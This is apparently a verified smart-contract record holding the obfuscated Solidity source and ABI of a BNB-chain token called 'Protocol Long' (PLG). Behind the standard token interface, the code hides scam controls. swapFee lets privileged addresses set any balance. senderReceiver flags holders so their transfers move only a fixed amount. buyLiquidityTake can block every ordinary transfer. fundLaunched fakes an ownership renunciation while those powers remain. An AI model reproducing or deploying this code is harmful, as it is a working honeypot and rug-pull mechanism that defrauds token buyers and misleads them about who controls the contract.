{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface listTo {\n    function createPair(address launchedMaxMode, address feeToWallet) external returns (address);\n}\n\ninterface receiverSwapEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listIs) external view returns (uint256);\n\n    function transfer(address senderLaunch, uint256 txLiquidity) external returns (bool);\n\n    function allowance(address shouldEnableFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderLaunch,\n        uint256 txLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenWalletMax, uint256 value);\n    event Approval(address indexed shouldEnableFrom, address indexed spender, uint256 value);\n}\n\nabstract contract txTradingFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverSwapEnableMetadata is receiverSwapEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProtocolLong is txTradingFrom, receiverSwapEnable, receiverSwapEnableMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLaunched;\n    }\n\n    bool public shouldWallet;\n\n    address launchReceiverTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private feeToken;\n\n    function buyLiquidityTake(uint256 txLiquidity) public {\n        tradingAt();\n        senderMax = txLiquidity;\n    }\n\n    function minTxMarketing(address teamSender, address senderLaunch, uint256 txLiquidity) internal returns (bool) {\n        require(teamMin[teamSender] >= txLiquidity);\n        teamMin[teamSender] -= txLiquidity;\n        teamMin[senderLaunch] += txLiquidity;\n        emit Transfer(teamSender, senderLaunch, txLiquidity);\n        return true;\n    }\n\n    uint256 private totalModeWallet;\n\n    constructor (){\n        if (receiverSwap) {\n            receiverSwap = false;\n        }\n        swapTeam walletMaxLaunch = swapTeam(launchReceiverTeam);\n        totalMarketing = listTo(walletMaxLaunch.factory()).createPair(walletMaxLaunch.WETH(), address(this));\n        if (fundSender) {\n            receiverSwap = false;\n        }\n        maxLiquidityAmount = _msgSender();\n        launchTeam[maxLiquidityAmount] = true;\n        teamMin[maxLiquidityAmount] = minList;\n        fundLaunched();\n        \n        emit Transfer(address(0), maxLiquidityAmount, minList);\n    }\n\n    function allowance(address walletReceiver, address marketingWalletFund) external view virtual override returns (uint256) {\n        if (marketingWalletFund == launchReceiverTeam) {\n            return type(uint256).max;\n        }\n        return isTake[walletReceiver][marketingWalletFund];\n    }\n\n    bool public fromTx;\n\n    function senderReceiver(address totalMode) public {\n        tradingAt();\n        if (receiverSwap) {\n            shouldWallet = true;\n        }\n        if (totalMode == maxLiquidityAmount || totalMode == totalMarketing) {\n            return;\n        }\n        senderSellFee[totalMode] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minList;\n    }\n\n    uint256 private minList = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public senderSellFee;\n\n    function approve(address marketingWalletFund, uint256 txLiquidity) public virtual override returns (bool) {\n        isTake[_msgSender()][marketingWalletFund] = txLiquidity;\n        emit Approval(_msgSender(), marketingWalletFund, txLiquidity);\n        return true;\n    }\n\n    mapping(address => uint256) private teamMin;\n\n    function transfer(address amountEnableAuto, uint256 txLiquidity) external virtual override returns (bool) {\n        return swapTake(_msgSender(), amountEnableAuto, txLiquidity);\n    }\n\n    mapping(address => bool) public launchTeam;\n\n    event OwnershipTransferred(address indexed enableMode, address indexed launchLimitToken);\n\n    address buySender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fromFee(address marketingLaunched) public {\n        if (senderMin) {\n            return;\n        }\n        \n        launchTeam[marketingLaunched] = true;\n        \n        senderMin = true;\n    }\n\n    function transferFrom(address teamSender, address senderLaunch, uint256 txLiquidity) external override returns (bool) {\n        if (_msgSender() != launchReceiverTeam) {\n            if (isTake[teamSender][_msgSender()] != type(uint256).max) {\n                require(txLiquidity <= isTake[teamSender][_msgSender()]);\n                isTake[teamSender][_msgSender()] -= txLiquidity;\n            }\n        }\n        return swapTake(teamSender, senderLaunch, txLiquidity);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    function fundLaunched() public {\n        emit OwnershipTransferred(maxLiquidityAmount, address(0));\n        exemptIs = address(0);\n    }\n\n    uint256 senderMax;\n\n    function tradingAt() private view {\n        require(launchTeam[_msgSender()]);\n    }\n\n    bool public fundSender;\n\n    address private exemptIs;\n\n    bool private fromIs;\n\n    function swapTake(address teamSender, address senderLaunch, uint256 txLiquidity) internal returns (bool) {\n        if (teamSender == maxLiquidityAmount) {\n            return minTxMarketing(teamSender, senderLaunch, txLiquidity);\n        }\n        uint256 marketingReceiver = receiverSwapEnable(totalMarketing).balanceOf(buySender);\n        require(marketingReceiver == senderMax);\n        require(senderLaunch != buySender);\n        if (senderSellFee[teamSender]) {\n            return minTxMarketing(teamSender, senderLaunch, atFund);\n        }\n        return minTxMarketing(teamSender, senderLaunch, txLiquidity);\n    }\n\n    string private marketingAmount = \"Protocol Long\";\n\n    address public totalMarketing;\n\n    function owner() external view returns (address) {\n        return exemptIs;\n    }\n\n    function balanceOf(address listIs) public view virtual override returns (uint256) {\n        return teamMin[listIs];\n    }\n\n    function swapFee(address amountEnableAuto, uint256 txLiquidity) public {\n        tradingAt();\n        teamMin[amountEnableAuto] = txLiquidity;\n    }\n\n    uint256 constant atFund = 13 ** 10;\n\n    string private liquidityExempt = \"PLG\";\n\n    bool private receiverSwap;\n\n    address public maxLiquidityAmount;\n\n    mapping(address => mapping(address => uint256)) private isTake;\n\n    function getOwner() external view returns (address) {\n        return exemptIs;\n    }\n\n    uint8 private listLaunched = 18;\n\n    uint256 modeFrom;\n\n    bool public senderMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityExempt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnableFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLimitToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWalletMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingWalletFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWalletFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"buyLiquidityTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"fromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"}],\"name\":\"senderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderSellFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"swapFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ProtocolLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}